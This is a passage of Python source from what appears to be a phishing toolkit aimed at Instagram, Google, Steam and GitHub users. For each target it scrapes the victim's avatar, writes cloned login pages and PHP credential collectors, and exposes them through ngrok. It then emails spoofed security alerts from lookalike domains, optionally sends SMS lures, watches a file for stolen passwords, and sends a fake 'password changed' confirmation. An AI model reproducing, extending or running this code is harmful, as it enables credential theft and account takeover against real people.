">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="font-size: 16px; line-height: 19px;">﻿Hello """+full_name+""", Your password was changed. </span>﻿</p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#9F7474;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#9F7474;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>OS:                     """+str(OSZ)+"""&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </strong><br></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>IP: """+str(IPZ)+"""&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </strong></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 14px;line-height: 17px"><span style="font-size: 14px; line-height: 16px;">Thanks for securing your account, for more information you can go to our support page fb.com/support.<br></span></p><p style="margin: 0;font-size: 14px;line-height: 17px"><br></p></div>	\n</div>\n</body></html>""")
	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Password Changed', '-m', email_changed_body_html, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system("reset")
	ENDst()

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################





def Instagram():

	instapic = ''


	Uname = input("     "+Grey+"["+Blue+"Username"+Grey+"]"+Green+": "+Reset)

	Phone_try = input("     "+Grey+"["+Blue+"Have targets Phone number"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Phone_try == "N":
		Phone = "NoPhone"
	elif Phone_try == "y":
		Phone = input("     "+Grey+"["+Blue+"Phone"+Grey+"]"+Green+": "+Reset)


	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
	Email_try = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Email_try == 'N':
		Email_OS = input("     "+Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)
		Email_time = input("     "+Grey+"["+Blue+"Time"+Grey+"]"+Green+": "+Reset)
		Email_from = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)
		Email_ip = input("     "+Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset)

	elif Email_try == 'y':
		Email_OS = random.choice(['Windows 8','Windows 7','Windows 10','Unknown','Linux','Android 6.0','Android 5.0','Android 4.0','ios 10.1','Mac OSX'])
		Email_time = str(random.choice(['3:14','4:36','9:04','21:43','14:32','1:13','2:23','16:56','10:34'])) + " GMT"
		Email_from = "North Palm Beach, USA"
		Email_ip = random.choice([
			"104.131.141.114",
			"104.131.206.23",
			"104.131.245.55",
			"104.131.4.237",
			"104.131.65.225",
			"104.156.224.83",
			"104.163.133.75",
			"104.167.123.52",
			"104.168.53.37",
			"104.168.57.75",
			"104.169.47.152",
			"104.191.31.69",
			"104.192.102.156",
			"104.194.157.151",
			"104.199.115.227",
			"104.206.237.23",
			"104.209.44.248",
			"104.215.23.88",
			"104.218.63.72",
			"104.218.63.73"])

	os.system("reset")
	print(Blue+"\n         ___  ________   ________  _________  ________             ")
	print(Blue+"        |\\  \\|\\   ___  \\|\\   ____\\|\\___   ___\\\\   __  \\            ")
	print(Blue+"        \\ \\  \\ \\  \\\\ \\  \\ \\  \\___|\\|___ \\  \\_\\ \\  \\|\\  \\           ")
	print(Blue+"         \\ \\  \\ \\  \\\\ \\  \\ \\_____  \\   \\ \\  \\ \\ \\   __  \\          ")
	print(Blue+"          \\ \\  \\ \\  \\\\ \\  \\|____|\\  \\   \\ \\  \\ \\ \\  \\ \\  \\         ")
	print(Blue+"           \\ \\__\\ \\__\\\\ \\__\\____\\_\\  \\   \\ \\__\\ \\ \\__\\ \\__\\        ")
	print(Blue+"            \\|__|\\|__| \\|__|\\_________\\   \\|__|  \\|__|\\|__|        ")
	print(Blue+"                           \\|_________|                            ")
	print(Blue+"                                                                   ")
	print(Blue+"                                                                   ")
	print(Blue+"             ___  ___  ________  ________  ___  __    ________     ")
	print(Blue+"            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ")
	print(Blue+"            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ")
	print(Blue+"             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ")
	print(Blue+"              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ")
	print(Blue+"               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\")
	print(Blue+"                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"+Green+"V1.0\n")
	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)


	time.sleep(3)
	link = "https://instagram.com/"+str(Uname)+"/"

	display = Display(visible=0, size=(800, 600))
	display.start()

	br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	br.get(link)
	time.sleep(8)
	l = ''
	try:
		l=br.find_element_by_css_selector("#react-root > section > main > div > header > div > div > div > button > img").get_attribute("src")

	except Exception:
		l=br.find_element_by_css_selector("#react-root > section > main > div > header > div > div > span > img").get_attribute("src")

	br.close()
	display.stop()

	phone_w=open('sms_support/phone','w')
	phone_w.write(str(Phone)+":"+str(Uname))
	phone_w.close()






	os.system("rm -r WEBSERVER/")

	subprocess.call(['mkdir','-p','WEBSERVER/'])

	filedata = str(Main_Instagram)
	filedata = filedata.replace('[l]', str(l))
	filedata = filedata.replace('[Uname]', str(Uname))

	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)
	  file.close()

	logindata = str(Login_Instagram)
	with open('./WEBSERVER/login.php', 'w') as file:
	  file.write(logindata)
	  file.close()

	secured_html = str(Secured_Instagram)
	with open('./WEBSERVER/account_secured.html', 'w') as file:
	  file.write(secured_html)
	  file.close()


	os.system("touch ./WEBSERVER/creds.txt")
	os.system("chmod -R 777 WEBSERVER/")



	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")

	time.sleep(3)

	display = Display(visible=0, size=(800, 600))
	display.start()


	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")

	time.sleep(5)

	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	phish_url = str(url_f)


	email_template = str(Email_Instagram)
	email_template = email_template.replace('[Uname]', str(Uname))
	email_template = email_template.replace('[Email_OS]', str(Email_OS))
	email_template = email_template.replace('[Email_time]', str(Email_time))
	email_template = email_template.replace('[Email_from]', str(Email_from))
	email_template = email_template.replace('[Email_ip]', str(Email_ip))
	email_template = email_template.replace('[phish_url]', str(phish_url))


	display.stop()

	from_email = random.choice(['no-reply@instagrams.com','security@instagrams.com'])



	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Security Alert', '-m', email_template, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system("reset")

	if Phone_try == "N":
		pass
	elif Phone_try == "y":
		os.system("xterm -e \"python3 ./sms_support/instagram_sms.py\" &")

	banN()

	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on Uname:\033[0;94m"+str(Uname)+"\033[0;37m #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phish_url+"\033[0;93m\n")


	os.system("tail -f ./WEBSERVER/creds.txt")

	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")

	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")

	print("                             one last step!!\n")

	IPZ=input(Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset)
	OSZ=input(Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)

	Last_EM = str(Email2_Instagram)
	Last_EM = Last_EM.replace('[Uname]', str(Uname))
	Last_EM = Last_EM.replace('[OSZ]', str(OSZ))
	Last_EM = Last_EM.replace('[IPZ]', str(IPZ))


	subprocess.call(['sendemail', '-f', from_email,'-t', Email, '-u', 'Password Changed', '-m', Last_EM, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system("reset")
	ENDst()

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################



def Google():
	utc = datetime.datetime.utcnow()
	loc = ""
	time1 = ""

	em = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)
	full_name = input("     "+Grey+"["+Blue+"Accounts Full Name"+Grey+"]"+Green+": "+Reset)

	from_email = input("     "+Grey+"["+Blue+"Spoofed Mail"+Grey+"]"+Green+": "+Reset)

	Phone_try = input("     "+Grey+"["+Blue+"Have targets Phone number"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if Phone_try == "N":
		Phone = "NoPhone"
	elif Phone_try == "y":
		Phone = input("     "+Grey+"["+Blue+"Phone"+Grey+"]"+Green+": "+Reset)

	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)
	if rndm == "N":
		time1 = input("     "+Grey+"["+Blue+"Time"+Grey+"]"+Green+": "+Reset)
		loc = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)


	elif rndm == "y":
		loc = 'North Palm Beach, USA'
		time1 = str(utc.strftime("%H:%M:%S"))+" (UTC)"

	os.system("reset")
	print(Blue+"         ________      ________  ________  ________                ")
	print(Blue+"        |\\   ____\\    |\\   __  \\|\\   ____\\|\\   ____\\               ")
	print(Blue+"        \\ \\  \\___|    \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\___|               ")
	print(Blue+"         \\ \\  \\  ___   \\ \\   __  \\ \\  \\    \\ \\  \\                  ")
	print(Blue+"          \\ \\  \\|\\  \\ __\\ \\  \\ \\  \\ \\  \\____\\ \\  \\____             ")
	print(Blue+"           \\ \\_______\\\\__\\ \\__\\ \\__\\ \\_______\\ \\_______\\           ")
	print(Blue+"            \\|_______\\|__|\\|__|\\|__|\\|_______|\\|_______|           ")
	print(Blue+"                                                                   ")
	print(Blue+"                                                                   ")
	print(Blue+"                                                                   ")
	print(Blue+"             ___  ___  ________  ________  ___  __    ________     ")
	print(Blue+"            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ")
	print(Blue+"            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ")
	print(Blue+"             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ")
	print(Blue+"              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ")
	print(Blue+"               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\")
	print(Blue+"                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"+Green+"V1.0\n")
	print("                            "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)




	url = "http://picasaweb.google.com/data/entry/api/user/"+em

	resp = requests.get(url)
	s = resp.text
	pic='http://geomla.grf.bg.ac.rs/site_media/static/landio/img/avatar.png'


	first_name = full_name.strip().split(" ",1)[0]


	if s == "Unknown user.":
		pass

	else:
		pic = str((s.split('<gphoto:thumbnail>'))[1].split('</gphoto:thumbnail>')[0])




	phone_w=open('sms_support/phone','w')
	phone_w.write(str(Phone)+":"+str(first_name))
	phone_w.close()

	os.system("rm -r ./WEBSERVER")
	os.system('mkdir ./WEBSERVER')

	filedata = str(Main_Google)
	filedata = filedata.replace('[IMG]', str(pic))
	filedata = filedata.replace('[FULL_NAME]', str(full_name))
	filedata = filedata.replace('[NAME]', str(first_name))
	filedata = filedata.replace('[EMAIL]', str(em))
	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)
	  file.close()
	filedata = str(Login1_Google)
	with open('./WEBSERVER/login_pass.php', 'w') as file:
	  file.write(filedata)
	filedata = str(Main2_Google)
	with open('./WEBSERVER/new_pass.html', 'w') as file:
	  file.write(filedata)
	filedata = str(Login2_Google)
	with open('./WEBSERVER/login.php', 'w') as file:
	  file.write(filedata)
	filedata = str(Secured_Google)
	with open('./WEBSERVER/account_secured.html', 'w') as file:
	  file.write(filedata)
	os.system('touch ./WEBSERVER/creds.txt')
	os.system('chmod -R 777 ./WEBSERVER/')
	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")
	time.sleep(3)
	display = Display(visible=0, size=(800, 600))
	display.start()

	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")
	time.sleep(5)
	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	phish_url = str(url_f)
	display.stop()
	emaildata = str(Email_Google)
	emaildata = emaildata.replace('[First_Name]', str(first_name))
	emaildata = emaildata.replace('[OPTION]', str(' '))
	emaildata = emaildata.replace('[LOC]', loc)
	emaildata = emaildata.replace('[TIME]', time1)
	emaildata = emaildata.replace('[PHISHING_URL]', str(phish_url))
	emaildata = emaildata.replace('[EMAIL]', str(em+' '))
	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Log-in attempt', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
	if Phone_try == "N":
		pass
	elif Phone_try == "y":
		os.system("xterm -e \"python3 ./sms_support/google_sms.py\" &")
	os.system("reset")

	banN()

	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on G-ACC: \033[0;94m"+str(full_name)+"\033[0;37m #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phish_url+"\033[0;93m\n")

	os.system("tail -f ./WEBSERVER/creds.txt")
	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")
	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")
	print("               Automatically Sending a Confirmation Email!!\n")
	email2data = str(Email2_Google)
	email2data = email2data.replace('[First_Name]', str(first_name))
	email2data = email2data.replace('[OPTION]', str(' '))
	email2data = email2data.replace('[EMAIL]', str(' '))
	subprocess.call(['sendemail', '-f', from_email,'-t', str(em), '-u', 'Password Changed', '-m', email2data, '-s', smtps+":"+port, '-xu', username, '-xp', password])
	os.system("reset")
	ENDst()

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################

def Steam():
	pic = ''

	UNAME = input("     "+Grey+"["+Blue+"Username/ID"+Grey+"]"+Green+": "+Reset)

	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)

	os.system('reset')
	print(Blue+"""       ________  _________  _______   ________  _____ ______           """)
	print(Blue+"""      |\\   ____\\|\\___   ___\\\\  ___ \\ |\\   __  \\|\\   _ \\  _   \\         """)
	print(Blue+"""      \\ \\  \\___|\\|___ \\  \\_\\ \\   __/|\\ \\  \\|\\  \\ \\  \\\\\\__\\ \\  \\        """)
	print(Blue+"""       \\ \\_____  \\   \\ \\  \\ \\ \\  \\_|/_\\ \\   __  \\ \\  \\\\|__| \\  \\       """)
	print(Blue+"""        \\|____|\\  \\   \\ \\  \\ \\ \\  \\_|\\ \\ \\  \\ \\  \\ \\  \\    \\ \\  \\      """)
	print(Blue+"""          ____\\_\\  \\   \\ \\__\\ \\ \\_______\\ \\__\\ \\__\\ \\__\\    \\ \\__\\     """)
	print(Blue+"""         |\\_________\\   \\|__|  \\|_______|\\|__|\\|__|\\|__|     \\|__|     """)
	print(Blue+"""         \\|_________|                                                  """)
	print(Blue+"""                                                                       """)
	print(Blue+"""                                                                       """)
	print(Blue+"""             ___  ___  ________  ________  ___  __    ________     """)
	print(Blue+"""            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    """)
	print(Blue+"""            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   """)
	print(Blue+"""             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  """)
	print(Blue+"""              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ """)
	print(Blue+"""               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\""")
	print(Blue+"""                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|"""+Green+'V1.0 \n')
	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)

	display = Display(visible=0, size=(800, 600))
	display.start()
	br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')

	try:
		br.get('https://steamcommunity.com/id/'+str(UNAME))
		time.sleep(1)
		pic = br.find_element_by_css_selector('.playerAvatarAutoSizeInner > img:nth-child(1)').get_attribute("src")
	except Exception:
		br.get('https://steamcommunity.com/profiles/'+str(UNAME))
		time.sleep(1)
		pic = br.find_element_by_css_selector('.playerAvatarAutoSizeInner > img:nth-child(1)').get_attribute("src")

	NAME = br.find_element_by_css_selector('.profile_header_centered_persona > div:nth-child(1) > span:nth-child(1)').text

	br.close()
	display.stop()

	os.system('rm -r ./WEBSERVER')
	os.system('mkdir ./WEBSERVER')


	filedata = str(Main_steam)
	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)


	filedata = str(ChangePass_steam)

	filedata = filedata.replace('[PIC]', str(pic))
	filedata = filedata.replace('[NAME]', str(NAME))

	with open('./WEBSERVER/change_password.html', 'w') as file:
	  file.write(filedata)



	filedata = str(Secured_steam)
	with open('./WEBSERVER/account_secured.html', 'w') as file:
	  file.write(filedata)



	filedata = str(Login_steam)
	with open('./WEBSERVER/login.php', 'w') as file:
	  file.write(filedata)


	filedata = str(Login2_steam)
	with open('./WEBSERVER/login2.php', 'w') as file:
	  file.write(filedata)


	os.system('echo "" > ./WEBSERVER/creds.txt')


	code = random.choice(['4JN89','9KL07','57LK1','K85D0','7GHS5'])


	os.system('chmod -R 777 ./WEBSERVER/')
	os.system('xterm -e "cd ./WEBSERVER/ && php -S 127.0.0.1:80" &')
	os.system("./ngrok http 80 > /dev/null &")
	time.sleep(3)
	display = Display(visible=0, size=(800, 600))
	display.start()
	browser = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
	browser.get("http://localhost:4040/status")
	time.sleep(5)
	url_f=str(browser.find_element_by_css_selector("li.list-unstyled:nth-child(1) > div:nth-child(2) > table:nth-child(2) > tbody:nth-child(1) > tr:nth-child(1) > td:nth-child(2)").text)
	browser.close()
	display.stop()
	phishin_url = str(url_f)


	emaildata = str(Email_steam)


	emaildata = emaildata.replace('[EMAIL]', str(Email))
	emaildata = emaildata.replace('[CODE]', str(code))
	emaildata = emaildata.replace('[PHISH]', str(phishin_url))

	from_email = str(random.choice(['security@steammails.com','no-reply@steammails.com']))

	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Trying to login?', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system('reset')
	banN()

	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on U/ID: \033[0;94m"+str(UNAME)+"\033[0;37m #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")

	os.system('tail -f ./WEBSERVER/creds.txt')
	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")
	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")
	print("               Automatically Sending a Confirmation Email!!\n")

	emaildata = str(Email1_steam)
	emaildata = emaildata.replace('[EMAIL]', str(Email))

	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'password changed', '-m', emaildata, '-s', smtps+":"+port, '-xu', username, '-xp', password])
	os.system("reset")
	ENDst()


#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################
#############################################################################################################################


def Github():

	pic = ''
	loc = ''

	UNAME = input("     "+Grey+"["+Blue+"Username"+Grey+"]"+Green+": "+Reset)
	Email = input("     "+Grey+"["+Blue+"Email"+Grey+"]"+Green+": "+Reset)

	rndm = input("     "+Grey+"["+Blue+"Wanna use random settings for the email"+Grey+"]"+Green+"?- "+Grey+"["+Blue+"y"+Grey+"/"+Blue+"N"+Grey+"]"+Green+": "+Reset)

	if rndm == "N":
		loc = input("     "+Grey+"["+Blue+"Location"+Grey+"]"+Green+": "+Reset)

	elif rndm == "y":
		loc = random.choice(['Iraq','Egypt','Russia'])


	os.system('reset')
	print(Blue+'                    ________  ___  _________                       ')
	print(Blue+'                   |\\   ____\\|\\  \\|\\___   ___\\                     ')
	print(Blue+'                   \\ \\  \\___|\\ \\  \\|___ \\  \\_|                     ')
	print(Blue+'                    \\ \\  \\  __\\ \\  \\   \\ \\  \\                      ')
	print(Blue+'                     \\ \\  \\|\\  \\ \\  \\   \\ \\  \\                     ')
	print(Blue+'                      \\ \\_______\\ \\__\\   \\ \\__\\                    ')
	print(Blue+'                       \\|_______|\\|__|    \\|__|                    ')
	print(Blue+'                                                                   ')
	print(Blue+'                                                                   ')
	print(Blue+'                                                                   ')
	print(Blue+'             ___  ___  ________  ________  ___  __    ________     ')
	print(Blue+'            |\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\ |\\   __  \\    ')
	print(Blue+'            \\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|\\ \\  \\|\\  \\   ')
	print(Blue+'             \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\ \\   __  \\  ')
	print(Blue+'              \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\ \\  \\ \\  \\ ')
	print(Blue+'               \\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\ \\__\\ \\__\\')
	print(Blue+'                \\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|\\|__|\\|__|'+Green+'V1.0\n')
	print("                             "+Grey+"["+Green+"Attack Has Started"+Grey+"]"+Reset)


	display = Display(visible=0, size=(800, 600))
	display.start()

	try:
		br = webdriver.Firefox(firefox_binary=binary,executable_path='base/geckodriver')
		time.sleep(2)
		GITURL = 'https://www.github.com/'+str(UNAME)
		br.get(GITURL)
		time.sleep(4)
		img = br.find_element_by_css_selector('img.avatar:nth-child(1)').get_attribute("src")
	except Exception:
		print('\n     '+Red+'BUZZZ, user Doesn\'t exist')
		sys.exit(0)

	display.stop()


	os.system('rm -r ./WEBSERVER/')
	os.system('mkdir ./WEBSERVER')

	filedata = str(Main_github)

	filedata = filedata.replace('[PIC]', str(img))
	filedata = filedata.replace('[UNAME]', str(UNAME))
	filedata = filedata.replace('[OPTION]', '')

	with open('./WEBSERVER/index.html', 'w') as file:
	  file.write(filedata)



	filedata = str(Main_github)

	filedata = filedata.replace('[PIC]', str(img))
	filedata = filedata.replace('[UNAME]', str(UNAME))
	filedata = filedata.replace('[OPTION]', str(Option_github))

